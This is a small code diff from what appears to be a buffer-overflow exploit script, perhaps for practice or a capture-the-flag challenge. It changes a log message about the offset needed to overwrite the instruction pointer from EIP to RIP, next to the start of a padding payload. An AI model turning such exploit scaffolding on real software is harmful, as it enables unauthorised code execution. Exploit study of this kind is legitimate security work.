@@ -49,7 +49,7 @@ def exploit(binary_path):
 
         # Get the offset by calling the find_offset() function
         offset = find_offset(binary_path)
-        log.debug(f"The offset calculate to overwrite EIP is {offset} bytes")
+        log.debug(f"The offset calculate to overwrite RIP is {offset} bytes")
 
         # Construct the payload
         payload = b'\x69' * offset
